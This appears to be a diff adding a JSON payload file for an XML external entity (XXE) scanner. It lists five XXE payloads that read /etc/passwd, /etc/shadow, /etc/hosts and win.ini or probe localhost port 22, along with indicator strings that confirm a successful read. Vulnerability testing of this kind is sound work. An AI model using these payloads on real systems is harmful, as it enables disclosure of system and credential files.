@@ -1,0 +1,18 @@
+{
+  "payloads": [
+    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>",
+    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://localhost:22\">]><foo>&xxe;</foo>",
+    "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///etc/hosts\">]><data>&file;</data>",
+    "<?xml version=\"1.0\"?><!DOCTYPE replace [<!ENTITY ent SYSTEM \"file:///etc/shadow\"> ]><userInfo><firstName>John</firstName><lastName>&ent;</lastName></userInfo>"
+  ],
+  "indicators": [
+    "root:x:",
+    "daemon:",
+    "bin:",
+    "[fonts]",
+    "[extensions]",
+    "localhost",
+    "127.0.0.1"
+  ]
+}
